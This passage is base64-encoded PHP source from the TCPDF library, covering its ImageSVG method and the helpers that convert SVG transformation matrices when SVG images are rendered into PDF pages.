ZGVyIEluZGljYXRlcyBpZiBib3JkZXJzIG11c3QgYmUgZHJhd24gYXJvdW5kIHRoZSBjZWxsLiBUaGUgdmFsdWUgY2FuIGJlIGEgbnVtYmVyOjx1bD48bGk+MDogbm8gYm9yZGVyIChkZWZhdWx0KTwvbGk+PGxpPjE6IGZyYW1lPC9saT48L3VsPiBvciBhIHN0cmluZyBjb250YWluaW5nIHNvbWUgb3IgYWxsIG9mIHRoZSBmb2xsb3dpbmcgY2hhcmFjdGVycyAoaW4gYW55IG9yZGVyKTo8dWw+PGxpPkw6IGxlZnQ8L2xpPjxsaT5UOiB0b3A8L2xpPjxsaT5SOiByaWdodDwvbGk+PGxpPkI6IGJvdHRvbTwvbGk+PC91bD4gb3IgYW4gYXJyYXkgb2YgbGluZSBzdHlsZXMgZm9yIGVhY2ggYm9yZGVyIGdyb3VwIC0gZm9yIGV4YW1wbGU6IGFycmF5KCdMVFJCJyA9PiBhcnJheSgnd2lkdGgnID0+IDIsICdjYXAnID0+ICdidXR0JywgJ2pvaW4nID0+ICdtaXRlcicsICdkYXNoJyA9PiAwLCAnY29sb3InID0+IGFycmF5KDAsIDAsIDApKSkKCSAqIEBwYXJhbSBib29sZWFuICRmaXRvbnBhZ2UgaWYgdHJ1ZSB0aGUgaW1hZ2UgaXMgcmVzaXplZCB0byBub3QgZXhjZWVkIHBhZ2UgZGltZW5zaW9ucy4KCSAqIEBhdXRob3IgTmljb2xhIEFzdW5pCgkgKiBAc2luY2UgNS4wLjAwMCAoMjAxMC0wNS0wMikKCSAqIEBwdWJsaWMKCSAqLwoJcHVibGljIGZ1bmN0aW9uIEltYWdlU1ZHKCRmaWxlLCAkeD1udWxsLCAkeT1udWxsLCAkdz0wLCAkaD0wLCAkbGluaz0nJywgJGFsaWduPScnLCAkcGFsaWduPScnLCAkYm9yZGVyPTAsICRmaXRvbnBhZ2U9ZmFsc2UpIHsKCQlpZiAoJHRoaXMtPnN0YXRlICE9IDIpIHsKCQkJIHJldHVybjsKCQl9CgkJLy8gcmVzZXQgU1ZHIHZhcnMKCQkkdGhpcy0+c3ZnZ3JhZGllbnRzID0gYXJyYXkoKTsKCQkkdGhpcy0+c3ZnZ3JhZGllbnRpZCA9IDA7CgkJJHRoaXMtPnN2Z2RlZnNtb2RlID0gZmFsc2U7CgkJJHRoaXMtPnN2Z2RlZnMgPSBhcnJheSgpOwoJCSR0aGlzLT5zdmdjbGlwbW9kZSA9IGZhbHNlOwoJCSR0aGlzLT5zdmdjbGlwcGF0aHMgPSBhcnJheSgpOwoJCSR0aGlzLT5zdmdjbGlwdG0gPSBhcnJheSgpOwoJCSR0aGlzLT5zdmdjbGlwaWQgPSAwOwoJCSR0aGlzLT5zdmd0ZXh0ID0gJyc7CgkJJHRoaXMtPnN2Z3RleHRtb2RlID0gYXJyYXkoKTsKCQlpZiAoJHRoaXMtPnJhc3Rlcml6ZV92ZWN0b3JfaW1hZ2VzIEFORCAoJHcgPiAwKSBBTkQgKCRoID4gMCkpIHsKCQkJLy8gY29udmVydCBTVkcgdG8gcmFzdGVyIGltYWdlIHVzaW5nIEdEIG9yIEltYWdlTWFnaWNrIGxpYnJhcmllcwoJCQlyZXR1cm4gJHRoaXMtPkltYWdlKCRmaWxlLCAkeCwgJHksICR3LCAkaCwgJ1NWRycsICRsaW5rLCAkYWxpZ24sIHRydWUsIDMwMCwgJHBhbGlnbiwgZmFsc2UsIGZhbHNlLCAkYm9yZGVyLCBmYWxzZSwgZmFsc2UsIGZhbHNlKTsKCQl9CgkJaWYgKCRmaWxlWzBdID09PSAnQCcpIHsgLy8gaW1hZ2UgZnJvbSBzdHJpbmcKCQkJJHRoaXMtPnN2Z2RpciA9ICcnOwoJCQkkc3ZnZGF0YSA9IHN1YnN0cigkZmlsZSwgMSk7CgkJfSBlbHNlIHsgLy8gU1ZHIGZpbGUKCQkJJHRoaXMtPnN2Z2RpciA9IGRpcm5hbWUoJGZpbGUpOwogICAgICAgICAgICAkc3ZnZGF0YSA9ICR0aGlzLT5nZXRDYWNoZWRGaWxlQ29udGVudHMoJGZpbGUpOwoJCX0KCQlpZiAoJHN2Z2RhdGEgPT09IEZBTFNFKSB7CgkJCSR0aGlzLT5FcnJvcignU1ZHIGZpbGUgbm90IGZvdW5kOiAnLiRmaWxlKTsKCQl9CgkJaWYgKFRDUERGX1NUQVRJQzo6ZW1wdHlfc3RyaW5nKCR4KSkgewoJCQkkeCA9ICR0aGlzLT54OwoJCX0KCQlpZiAoVENQREZfU1RBVElDOjplbXB0eV9zdHJpbmcoJHkpKSB7CgkJCSR5ID0gJHRoaXMtPnk7CgkJfQoJCS8vIGNoZWNrIHBhZ2UgZm9yIG5vLXdyaXRlIHJlZ2lvbnMgYW5kIGFkYXB0IHBhZ2UgbWFyZ2lucyBpZiBuZWNlc3NhcnkKCQlsaXN0KCR4LCAkeSkgPSAkdGhpcy0+Y2hlY2tQYWdlUmVnaW9ucygkaCwgJHgsICR5KTsKCQkkayA9ICR0aGlzLT5rOwoJCSRveCA9IDA7CgkJJG95ID0gMDsKCQkkb3cgPSAkdzsKCQkkb2ggPSAkaDsKCQkkYXNwZWN0X3JhdGlvX2FsaWduID0gJ3hNaWRZTWlkJzsKCQkkYXNwZWN0X3JhdGlvX21zID0gJ21lZXQnOwoJCSRyZWdzID0gYXJyYXkoKTsKCQkvLyBnZXQgb3JpZ2luYWwgaW1hZ2Ugd2lkdGggYW5kIGhlaWdodAoJCXByZWdfbWF0Y2goJy88c3ZnKFteXD5dKik+L3NpJywgJHN2Z2RhdGEsICRyZWdzKTsKCQlpZiAoaXNzZXQoJHJlZ3NbMV0pIEFORCAhZW1wdHkoJHJlZ3NbMV0pKSB7CgkJCSR0bXAgPSBhcnJheSgpOwoJCQlpZiAocHJlZ19tYXRjaCgnL1tcc10reFtcc10qPVtcc10qIihbXiJdKikiL3NpJywgJHJlZ3NbMV0sICR0bXApKSB7CgkJCQkkb3ggPSAkdGhpcy0+Z2V0SFRNTFVuaXRUb1VuaXRzKCR0bXBbMV0sIDAsICR0aGlzLT5zdmd1bml0LCBmYWxzZSk7CgkJCX0KCQkJJHRtcCA9IGFycmF5KCk7CgkJCWlmIChwcmVnX21hdGNoKCcvW1xzXSt5W1xzXSo9W1xzXSoiKFteIl0qKSIvc2knLCAkcmVnc1sxXSwgJHRtcCkpIHsKCQkJCSRveSA9ICR0aGlzLT5nZXRIVE1MVW5pdFRvVW5pdHMoJHRtcFsxXSwgMCwgJHRoaXMtPnN2Z3VuaXQsIGZhbHNlKTsKCQkJfQoJCQkkdG1wID0gYXJyYXkoKTsKCQkJaWYgKHByZWdfbWF0Y2goJy9bXHNdK3dpZHRoW1xzXSo9W1xzXSoiKFteIl0qKSIvc2knLCAkcmVnc1sxXSwgJHRtcCkpIHsKCQkJCSRvdyA9ICR0aGlzLT5nZXRIVE1MVW5pdFRvVW5pdHMoJHRtcFsxXSwgMSwgJHRoaXMtPnN2Z3VuaXQsIGZhbHNlKTsKCQkJfQoJCQkkdG1wID0gYXJyYXkoKTsKCQkJaWYgKHByZWdfbWF0Y2goJy9bXHNdK2hlaWdodFtcc10qPVtcc10qIihbXiJdKikiL3NpJywgJHJlZ3NbMV0sICR0bXApKSB7CgkJCQkkb2ggPSAkdGhpcy0+Z2V0SFRNTFVuaXRUb1VuaXRzKCR0bXBbMV0sIDEsICR0aGlzLT5zdmd1bml0LCBmYWxzZSk7CgkJCX0KCQkJJHRtcCA9IGFycmF5KCk7CgkJCSR2aWV3X2JveCA9IGFycmF5KCk7CgkJCWlmIChwcmVnX21hdGNoKCcvW1xzXSt2aWV3Qm94W1xzXSo9W1xzXSoiW1xzXSooWzAtOVwuXC1dKylbXHNdKyhbMC05XC5cLV0rKVtcc10rKFswLTlcLl0rKVtcc10rKFswLTlcLl0rKVtcc10qIi9zaScsICRyZWdzWzFdLCAkdG1wKSkgewoJCQkJaWYgKGNvdW50KCR0bXApID09IDUpIHsKCQkJCQlhcnJheV9zaGlmdCgkdG1wKTsKCQkJCQlmb3JlYWNoICgkdG1wIGFzICRrZXkgPT4gJHZhbCkgewoJCQkJCQkkdmlld19ib3hbJGtleV0gPSAkdGhpcy0+Z2V0SFRNTFVuaXRUb1VuaXRzKCR2YWwsIDAsICR0aGlzLT5zdmd1bml0LCBmYWxzZSk7CgkJCQkJfQoJCQkJCSRveCA9ICR2aWV3X2JveFswXTsKCQkJCQkkb3kgPSAkdmlld19ib3hbMV07CgkJCQl9CgkJCQkvLyBnZXQgYXNwZWN0IHJhdGlvCgkJCQkkdG1wID0gYXJyYXkoKTsKCQkJCWlmIChwcmVnX21hdGNoKCcvW1xzXStwcmVzZXJ2ZUFzcGVjdFJhdGlvW1xzXSo9W1xzXSoiKFteIl0qKSIvc2knLCAkcmVnc1sxXSwgJHRtcCkpIHsKCQkJCQkkYXNwZWN0X3JhdGlvID0gcHJlZ19zcGxpdCgnL1tcc10rL3NpJywgJHRtcFsxXSk7CgkJCQkJc3dpdGNoIChjb3VudCgkYXNwZWN0X3JhdGlvKSkgewoJCQkJCQljYXNlIDM6IHsKCQkJCQkJCSRhc3BlY3RfcmF0aW9fYWxpZ24gPSAkYXNwZWN0X3JhdGlvWzFdOwoJCQkJCQkJJGFzcGVjdF9yYXRpb19tcyA9ICRhc3BlY3RfcmF0aW9bMl07CgkJCQkJCQlicmVhazsKCQkJCQkJfQoJCQkJCQljYXNlIDI6IHsKCQkJCQkJCSRhc3BlY3RfcmF0aW9fYWxpZ24gPSAkYXNwZWN0X3JhdGlvWzBdOwoJCQkJCQkJJGFzcGVjdF9yYXRpb19tcyA9ICRhc3BlY3RfcmF0aW9bMV07CgkJCQkJCQlicmVhazsKCQkJCQkJfQoJCQkJCQljYXNlIDE6IHsKCQkJCQkJCSRhc3BlY3RfcmF0aW9fYWxpZ24gPSAkYXNwZWN0X3JhdGlvWzBdOwoJCQkJCQkJJGFzcGVjdF9yYXRpb19tcyA9ICdtZWV0JzsKCQkJCQkJCWJyZWFrOwoJCQkJCQl9CgkJCQkJfQoJCQkJfQoJCQl9CgkJfQoJCWlmICgkb3cgPD0gMCkgewoJCQkkb3cgPSAxOwoJCX0KCQlpZiAoJG9oIDw9IDApIHsKCQkJJG9oID0gMTsKCQl9CgkJLy8gY2FsY3VsYXRlIGltYWdlIHdpZHRoIGFuZCBoZWlnaHQgb24gZG9jdW1lbnQKCQlpZiAoKCR3IDw9IDApIEFORCAoJGggPD0gMCkpIHsKCQkJLy8gY29udmVydCBpbWFnZSBzaXplIHRvIGRvY3VtZW50IHVuaXQKCQkJJHcgPSAkb3c7CgkJCSRoID0gJG9oOwoJCX0gZWxzZWlmICgkdyA8PSAwKSB7CgkJCSR3ID0gJGggKiAkb3cgLyAkb2g7CgkJfSBlbHNlaWYgKCRoIDw9IDApIHsKCQkJJGggPSAkdyAqICRvaCAvICRvdzsKCQl9CgkJLy8gZml0IHRoZSBpbWFnZSBvbiBhdmFpbGFibGUgc3BhY2UKCQlsaXN0KCR3LCAkaCwgJHgsICR5KSA9ICR0aGlzLT5maXRCbG9jaygkdywgJGgsICR4LCAkeSwgJGZpdG9ucGFnZSk7CgkJaWYgKCR0aGlzLT5yYXN0ZXJpemVfdmVjdG9yX2ltYWdlcykgewoJCQkvLyBjb252ZXJ0IFNWRyB0byByYXN0ZXIgaW1hZ2UgdXNpbmcgR0Qgb3IgSW1hZ2VNYWdpY2sgbGlicmFyaWVzCgkJCXJldHVybiAkdGhpcy0+SW1hZ2UoJGZpbGUsICR4LCAkeSwgJHcsICRoLCAnU1ZHJywgJGxpbmssICRhbGlnbiwgdHJ1ZSwgMzAwLCAkcGFsaWduLCBmYWxzZSwgZmFsc2UsICRib3JkZXIsIGZhbHNlLCBmYWxzZSwgZmFsc2UpOwoJCX0KCQkvLyBzZXQgYWxpZ25tZW50CgkJJHRoaXMtPmltZ19yYl95ID0gJHkgKyAkaDsKCQkvLyBzZXQgYWxpZ25tZW50CgkJaWYgKCR0aGlzLT5ydGwpIHsKCQkJaWYgKCRwYWxpZ24gPT0gJ0wnKSB7CgkJCQkkeGltZyA9ICR0aGlzLT5sTWFyZ2luOwoJCQl9IGVsc2VpZiAoJHBhbGlnbiA9PSAnQycpIHsKCQkJCSR4aW1nID0gKCR0aGlzLT53ICsgJHRoaXMtPmxNYXJnaW4gLSAkdGhpcy0+ck1hcmdpbiAtICR3KSAvIDI7CgkJCX0gZWxzZWlmICgkcGFsaWduID09ICdSJykgewoJCQkJJHhpbWcgPSAkdGhpcy0+dyAtICR0aGlzLT5yTWFyZ2luIC0gJHc7CgkJCX0gZWxzZSB7CgkJCQkkeGltZyA9ICR4IC0gJHc7CgkJCX0KCQkJJHRoaXMtPmltZ19yYl94ID0gJHhpbWc7CgkJfSBlbHNlIHsKCQkJaWYgKCRwYWxpZ24gPT0gJ0wnKSB7CgkJCQkkeGltZyA9ICR0aGlzLT5sTWFyZ2luOwoJCQl9IGVsc2VpZiAoJHBhbGlnbiA9PSAnQycpIHsKCQkJCSR4aW1nID0gKCR0aGlzLT53ICsgJHRoaXMtPmxNYXJnaW4gLSAkdGhpcy0+ck1hcmdpbiAtICR3KSAvIDI7CgkJCX0gZWxzZWlmICgkcGFsaWduID09ICdSJykgewoJCQkJJHhpbWcgPSAkdGhpcy0+dyAtICR0aGlzLT5yTWFyZ2luIC0gJHc7CgkJCX0gZWxzZSB7CgkJCQkkeGltZyA9ICR4OwoJCQl9CgkJCSR0aGlzLT5pbWdfcmJfeCA9ICR4aW1nICsgJHc7CgkJfQoJCS8vIHN0b3JlIGN1cnJlbnQgZ3JhcGhpYyB2YXJzCgkJJGd2YXJzID0gJHRoaXMtPmdldEdyYXBoaWNWYXJzKCk7CgkJLy8gc3RvcmUgU1ZHIHBvc2l0aW9uIGFuZCBzY2FsZSBmYWN0b3JzCgkJJHN2Z29mZnNldF94ID0gKCR4aW1nIC0gJG94KSAqICR0aGlzLT5rOwoJCSRzdmdvZmZzZXRfeSA9IC0oJHkgLSAkb3kpICogJHRoaXMtPms7CgkJaWYgKGlzc2V0KCR2aWV3X2JveFsyXSkgQU5EICgkdmlld19ib3hbMl0gPiAwKSBBTkQgKCR2aWV3X2JveFszXSA+IDApKSB7CgkJCSRvdyA9ICR2aWV3X2JveFsyXTsKCQkJJG9oID0gJHZpZXdfYm94WzNdOwoJCX0gZWxzZSB7CgkJCWlmICgkb3cgPD0gMCkgewoJCQkJJG93ID0gJHc7CgkJCX0KCQkJaWYgKCRvaCA8PSAwKSB7CgkJCQkkb2ggPSAkaDsKCQkJfQoJCX0KCQkkc3Znc2NhbGVfeCA9ICR3IC8gJG93OwoJCSRzdmdzY2FsZV95ID0gJGggLyAkb2g7CgkJLy8gc2NhbGluZyBhbmQgYWxpZ25tZW50CgkJaWYgKCRhc3BlY3RfcmF0aW9fYWxpZ24gIT0gJ25vbmUnKSB7CgkJCS8vIHN0b3JlIGN1cnJlbnQgc2NhbGluZyB2YWx1ZXMKCQkJJHN2Z3NjYWxlX29sZF94ID0gJHN2Z3NjYWxlX3g7CgkJCSRzdmdzY2FsZV9vbGRfeSA9ICRzdmdzY2FsZV95OwoJCQkvLyBmb3JjZSB1bmlmb3JtIHNjYWxpbmcKCQkJaWYgKCRhc3BlY3RfcmF0aW9fbXMgPT0gJ3NsaWNlJykgewoJCQkJLy8gdGhlIGVudGlyZSB2aWV3cG9ydCBpcyBjb3ZlcmVkIGJ5IHRoZSB2aWV3Qm94CgkJCQlpZiAoJHN2Z3NjYWxlX3ggPiAkc3Znc2NhbGVfeSkgewoJCQkJCSRzdmdzY2FsZV95ID0gJHN2Z3NjYWxlX3g7CgkJCQl9IGVsc2VpZiAoJHN2Z3NjYWxlX3ggPCAkc3Znc2NhbGVfeSkgewoJCQkJCSRzdmdzY2FsZV94ID0gJHN2Z3NjYWxlX3k7CgkJCQl9CgkJCX0gZWxzZSB7IC8vIG1lZXQKCQkJCS8vIHRoZSBlbnRpcmUgdmlld0JveCBpcyB2aXNpYmxlIHdpdGhpbiB0aGUgdmlld3BvcnQKCQkJCWlmICgkc3Znc2NhbGVfeCA8ICRzdmdzY2FsZV95KSB7CgkJCQkJJHN2Z3NjYWxlX3kgPSAkc3Znc2NhbGVfeDsKCQkJCX0gZWxzZWlmICgkc3Znc2NhbGVfeCA+ICRzdmdzY2FsZV95KSB7CgkJCQkJJHN2Z3NjYWxlX3ggPSAkc3Znc2NhbGVfeTsKCQkJCX0KCQkJfQoJCQkvLyBjb3JyZWN0IFggYWxpZ25tZW50CgkJCXN3aXRjaCAoc3Vic3RyKCRhc3BlY3RfcmF0aW9fYWxpZ24sIDEsIDMpKSB7CgkJCQljYXNlICdNaW4nOiB7CgkJCQkJLy8gZG8gbm90aGluZwoJCQkJCWJyZWFrOwoJCQkJfQoJCQkJY2FzZSAnTWF4JzogewoJCQkJCSRzdmdvZmZzZXRfeCArPSAoKCR3ICogJHRoaXMtPmspIC0gKCRvdyAqICR0aGlzLT5rICogJHN2Z3NjYWxlX3gpKTsKCQkJCQlicmVhazsKCQkJCX0KCQkJCWRlZmF1bHQ6CgkJCQljYXNlICdNaWQnOiB7CgkJCQkJJHN2Z29mZnNldF94ICs9ICgoKCR3ICogJHRoaXMtPmspIC0gKCRvdyAqICR0aGlzLT5rICogJHN2Z3NjYWxlX3gpKSAvIDIpOwoJCQkJCWJyZWFrOwoJCQkJfQoJCQl9CgkJCS8vIGNvcnJlY3QgWSBhbGlnbm1lbnQKCQkJc3dpdGNoIChzdWJzdHIoJGFzcGVjdF9yYXRpb19hbGlnbiwgNSkpIHsKCQkJCWNhc2UgJ01pbic6IHsKCQkJCQkvLyBkbyBub3RoaW5nCgkJCQkJYnJlYWs7CgkJCQl9CgkJCQljYXNlICdNYXgnOiB7CgkJCQkJJHN2Z29mZnNldF95IC09ICgoJGggKiAkdGhpcy0+aykgLSAoJG9oICogJHRoaXMtPmsgKiAkc3Znc2NhbGVfeSkpOwoJCQkJCWJyZWFrOwoJCQkJfQoJCQkJZGVmYXVsdDoKCQkJCWNhc2UgJ01pZCc6IHsKCQkJCQkkc3Znb2Zmc2V0X3kgLT0gKCgoJGggKiAkdGhpcy0+aykgLSAoJG9oICogJHRoaXMtPmsgKiAkc3Znc2NhbGVfeSkpIC8gMik7CgkJCQkJYnJlYWs7CgkJCQl9CgkJCX0KCQl9CgkJLy8gc3RvcmUgY3VycmVudCBwYWdlIGJyZWFrIG1vZGUKCQkkcGFnZV9icmVha19tb2RlID0gJHRoaXMtPkF1dG9QYWdlQnJlYWs7CgkJJHBhZ2VfYnJlYWtfbWFyZ2luID0gJHRoaXMtPmdldEJyZWFrTWFyZ2luKCk7CgkJJGNlbGxfcGFkZGluZyA9ICR0aGlzLT5jZWxsX3BhZGRpbmc7CgkJJHRoaXMtPnNldENlbGxQYWRkaW5nKDApOwoJCSR0aGlzLT5zZXRBdXRvUGFnZUJyZWFrKGZhbHNlKTsKCQkvLyBzYXZlIHRoZSBjdXJyZW50IGdyYXBoaWMgc3RhdGUKCQkkdGhpcy0+X291dCgncScuJHRoaXMtPmVwc21hcmtlcik7CgkJLy8gc2V0IGluaXRpYWwgY2xpcHBpbmcgbWFzawoJCSR0aGlzLT5SZWN0KCR4aW1nLCAkeSwgJHcsICRoLCAnQ05aJywgYXJyYXkoKSwgYXJyYXkoKSk7CgkJLy8gc2NhbGUgYW5kIHRyYW5zbGF0ZQoJCSRlID0gJG94ICogJHRoaXMtPmsgKiAoMSAtICRzdmdzY2FsZV94KTsKCQkkZiA9ICgkdGhpcy0+aCAtICRveSkgKiAkdGhpcy0+ayAqICgxIC0gJHN2Z3NjYWxlX3kpOwoJCSR0aGlzLT5fb3V0KHNwcmludGYoJyVGICVGICVGICVGICVGICVGIGNtJywgJHN2Z3NjYWxlX3gsIDAsIDAsICRzdmdzY2FsZV95LCAoJGUgKyAkc3Znb2Zmc2V0X3gpLCAoJGYgKyAkc3Znb2Zmc2V0X3kpKSk7CgkJLy8gY3JlYXRlcyBhIG5ldyBYTUwgcGFyc2VyIHRvIGJlIHVzZWQgYnkgdGhlIG90aGVyIFhNTCBmdW5jdGlvbnMKCQkkcGFyc2VyID0geG1sX3BhcnNlcl9jcmVhdGUoJ1VURi04Jyk7CgkJLy8gZGlzYWJsZSBjYXNlLWZvbGRpbmcgZm9yIHRoaXMgWE1MIHBhcnNlcgoJCXhtbF9wYXJzZXJfc2V0X29wdGlvbigkcGFyc2VyLCBYTUxfT1BUSU9OX0NBU0VfRk9MRElORywgMCk7CgkJLy8gc2V0cyB0aGUgZWxlbWVudCBoYW5kbGVyIGZ1bmN0aW9ucyBmb3IgdGhlIFhNTCBwYXJzZXIKCQl4bWxfc2V0X2VsZW1lbnRfaGFuZGxlcigkcGFyc2VyLCBbJHRoaXMsICdzdGFydFNWR0VsZW1lbnRIYW5kbGVyJ10sIFskdGhpcywgJ2VuZFNWR0VsZW1lbnRIYW5kbGVyJ10pOwoJCS8vIHNldHMgdGhlIGNoYXJhY3RlciBkYXRhIGhhbmRsZXIgZnVuY3Rpb24gZm9yIHRoZSBYTUwgcGFyc2VyCgkJeG1sX3NldF9jaGFyYWN0ZXJfZGF0YV9oYW5kbGVyKCRwYXJzZXIsIFskdGhpcywgJ3NlZ1NWR0NvbnRlbnRIYW5kbGVyJ10pOwoJCS8vIHN0YXJ0IHBhcnNpbmcgYW4gWE1MIGRvY3VtZW50CgkJaWYgKCF4bWxfcGFyc2UoJHBhcnNlciwgJHN2Z2RhdGEpKSB7CgkJCSRlcnJvcl9tZXNzYWdlID0gc3ByaW50ZignU1ZHIEVycm9yOiAlcyBhdCBsaW5lICVkJywgeG1sX2Vycm9yX3N0cmluZyh4bWxfZ2V0X2Vycm9yX2NvZGUoJHBhcnNlcikpLCB4bWxfZ2V0X2N1cnJlbnRfbGluZV9udW1iZXIoJHBhcnNlcikpOwoJCQkkdGhpcy0+RXJyb3IoJGVycm9yX21lc3NhZ2UpOwoJCX0KCQkvLyBmcmVlIHRoaXMgWE1MIHBhcnNlcgoJCXhtbF9wYXJzZXJfZnJlZSgkcGFyc2VyKTsKCgkJLy8gPj0gUEhQIDcuMC4wICJleHBsaWNpdGx5IHVuc2V0IHRoZSByZWZlcmVuY2UgdG8gcGFyc2VyIHRvIGF2b2lkIG1lbW9yeSBsZWFrcyIKCQl1bnNldCgkcGFyc2VyKTsKCgkJLy8gcmVzdG9yZSBwcmV2aW91cyBncmFwaGljIHN0YXRlCgkJJHRoaXMtPl9vdXQoJHRoaXMtPmVwc21hcmtlci4nUScpOwoJCS8vIHJlc3RvcmUgZ3JhcGhpYyB2YXJzCgkJJHRoaXMtPnNldEdyYXBoaWNWYXJzKCRndmFycyk7CgkJJHRoaXMtPmxhc3RoID0gJGd2YXJzWydsYXN0aCddOwoJCWlmICghZW1wdHkoJGJvcmRlcikpIHsKCQkJJGJ4ID0gJHRoaXMtPng7CgkJCSRieSA9ICR0aGlzLT55OwoJCQkkdGhpcy0+eCA9ICR4aW1nOwoJCQlpZiAoJHRoaXMtPnJ0bCkgewoJCQkJJHRoaXMtPnggKz0gJHc7CgkJCX0KCQkJJHRoaXMtPnkgPSAkeTsKCQkJJHRoaXMtPkNlbGwoJHcsICRoLCAnJywgJGJvcmRlciwgMCwgJycsIDAsICcnLCAwLCB0cnVlKTsKCQkJJHRoaXMtPnggPSAkYng7CgkJCSR0aGlzLT55ID0gJGJ5OwoJCX0KCQlpZiAoJGxpbmspIHsKCQkJJHRoaXMtPkxpbmsoJHhpbWcsICR5LCAkdywgJGgsICRsaW5rLCAwKTsKCQl9CgkJLy8gc2V0IHBvaW50ZXIgdG8gYWxpZ24gdGhlIG5leHQgdGV4dC9vYmplY3RzCgkJc3dpdGNoKCRhbGlnbikgewoJCQljYXNlICdUJzp7CgkJCQkkdGhpcy0+eSA9ICR5OwoJCQkJJHRoaXMtPnggPSAkdGhpcy0+aW1nX3JiX3g7CgkJCQlicmVhazsKCQkJfQoJCQljYXNlICdNJzp7CgkJCQkkdGhpcy0+eSA9ICR5ICsgcm91bmQoJGgvMik7CgkJCQkkdGhpcy0+eCA9ICR0aGlzLT5pbWdfcmJfeDsKCQkJCWJyZWFrOwoJCQl9CgkJCWNhc2UgJ0InOnsKCQkJCSR0aGlzLT55ID0gJHRoaXMtPmltZ19yYl95OwoJCQkJJHRoaXMtPnggPSAkdGhpcy0+aW1nX3JiX3g7CgkJCQlicmVhazsKCQkJfQoJCQljYXNlICdOJzp7CgkJCQkkdGhpcy0+c2V0WSgkdGhpcy0+aW1nX3JiX3kpOwoJCQkJYnJlYWs7CgkJCX0KCQkJZGVmYXVsdDp7CgkJCQkvLyByZXN0b3JlIHBvaW50ZXIgdG8gc3RhcnRpbmcgcG9zaXRpb24KCQkJCSR0aGlzLT54ID0gJGd2YXJzWyd4J107CgkJCQkkdGhpcy0+eSA9ICRndmFyc1sneSddOwoJCQkJJHRoaXMtPnBhZ2UgPSAkZ3ZhcnNbJ3BhZ2UnXTsKCQkJCSR0aGlzLT5jdXJyZW50X2NvbHVtbiA9ICRndmFyc1snY3VycmVudF9jb2x1bW4nXTsKCQkJCSR0aGlzLT50TWFyZ2luID0gJGd2YXJzWyd0TWFyZ2luJ107CgkJCQkkdGhpcy0+Yk1hcmdpbiA9ICRndmFyc1snYk1hcmdpbiddOwoJCQkJJHRoaXMtPncgPSAkZ3ZhcnNbJ3cnXTsKCQkJCSR0aGlzLT5oID0gJGd2YXJzWydoJ107CgkJCQkkdGhpcy0+d1B0ID0gJGd2YXJzWyd3UHQnXTsKCQkJCSR0aGlzLT5oUHQgPSAkZ3ZhcnNbJ2hQdCddOwoJCQkJJHRoaXMtPmZ3UHQgPSAkZ3ZhcnNbJ2Z3UHQnXTsKCQkJCSR0aGlzLT5maFB0ID0gJGd2YXJzWydmaFB0J107CgkJCQlicmVhazsKCQkJfQoJCX0KCQkkdGhpcy0+ZW5kbGluZXggPSAkdGhpcy0+aW1nX3JiX3g7CgkJLy8gcmVzdG9yZSBwYWdlIGJyZWFrCgkJJHRoaXMtPnNldEF1dG9QYWdlQnJlYWsoJHBhZ2VfYnJlYWtfbW9kZSwgJHBhZ2VfYnJlYWtfbWFyZ2luKTsKCQkkdGhpcy0+Y2VsbF9wYWRkaW5nID0gJGNlbGxfcGFkZGluZzsKCX0KCgkvKioKCSAqIENvbnZlcnQgU1ZHIHRyYW5zZm9ybWF0aW9uIG1hdHJpeCB0byBQREYuCgkgKiBAcGFyYW0gYXJyYXkgJHRtIG9yaWdpbmFsIFNWRyB0cmFuc2Zvcm1hdGlvbiBtYXRyaXgKCSAqIEByZXR1cm4gYXJyYXkgdHJhbnNmb3JtYXRpb24gbWF0cml4CgkgKiBAcHJvdGVjdGVkCgkgKiBAc2luY2UgNS4wLjAwMCAoMjAxMC0wNS0wMikKCSAqLwoJcHJvdGVjdGVkIGZ1bmN0aW9uIGNvbnZlcnRTVkd0TWF0cml4KCR0bSkgewoJCSRhID0gJHRtWzBdOwoJCSRiID0gLSR0bVsxXTsKCQkkYyA9IC0kdG1bMl07CgkJJGQgPSAkdG1bM107CgkJJGUgPSAkdGhpcy0+Z2V0SFRNTFVuaXRUb1VuaXRzKCR0bVs0XSwgMSwgJHRoaXMtPnN2Z3VuaXQsIGZhbHNlKSAqICR0aGlzLT5rOwoJCSRmID0gLSR0aGlzLT5nZXRIVE1MVW5pdFRvVW5pdHMoJHRtWzVdLCAxLCAkdGhpcy0+c3ZndW5pdCwgZmFsc2UpICogJHRoaXMtPms7CgkJJHggPSAwOwoJCSR5ID0gJHRoaXMtPmggKiAkdGhpcy0+azsKCQkkZSA9ICgkeCAqICgxIC0gJGEpKSAtICgkeSAqICRjKSArICRlOwoJCSRmID0gKCR5ICogKDEgLSAkZCkpIC0gKCR4ICogJGIpICsgJGY7CgkJcmV0dXJuIGFycmF5KCRhLCAkYiwgJGMsICRkLCAkZSwgJGYpOwoJfQoKCS8qKgoJICogQXBwbHkgU1ZHIGdyYXBoaWMgdHJhbnNmb3JtYXRpb24gbWF0cml4LgoJICogQHBhcmFtIGFycmF5ICR0bSBvcmlnaW5hbCBTVkcgdHJhbnNmb3JtYXRpb24gbWF0cml4CgkgKiBAcHJvdGVjdGVkCgkgKiBAc2luY2UgNS4wLjAwMCAoMjAxMC0wNS0wMikKCSAqLwoJcHJvdGVjdGVkIGZ1bmN0aW9uIFNWR1RyYW5zZm9ybSgkdG0pIHsKCQkkdGhpcy0+VHJhbnNmb3JtKCR0aGlzLT5jb252ZXJ0U1ZHdE1hdHJpeCgkdG0pKTsKCX0KCgkvKioKCSAqIEFwcGx5IHRoZSByZXF1ZXN0ZWQgU1ZHIHN0eWxlcyAoKioqIFRPIEJFIENPTVBMRVRFRCAqKiopCgkgKiBAcGFyYW0gYXJyYXkgJHN2Z3N0eWxlIGFycmF5IG9mIFNWRyBzdHlsZXMgdG8gYXBwbHkKCSAqIEBwYXJhbSBhcnJheSAkcHJldnN2Z3N0eWxlIGFycmF5IG9mIHByZXZpb3VzIFNWRyBzdHlsZQoJICogQHBhcmFtIGludCAkeCBYIG9yaWdpbiBvZiB0aGUgYm91bmRpbmcgYm94CgkgKiBAcGFyYW0gaW50ICR5IFkgb3JpZ2luIG9mIHRoZSBib3VuZGluZyBib3gKCSAqIEBwYXJhbSBpbnQgJHcgd2lkdGggb2YgdGhlIGJvdW5kaW5nIGJveAoJICogQHBhcmFtIGludCAkaCBoZWlnaHQgb2YgdGhlIGJvdW5kaW5nIGJveAoJICogQHBhcmFtIHN0cmluZyAkY2xpcF9mdW5jdGlvbiBjbGlwIGZ1bmN0aW9uCgkgKiBAcGFyYW0gYXJyYXkgJGNsaXBfcGFyYW1zIGFycmF5IG9mIHBhcmFtZXRl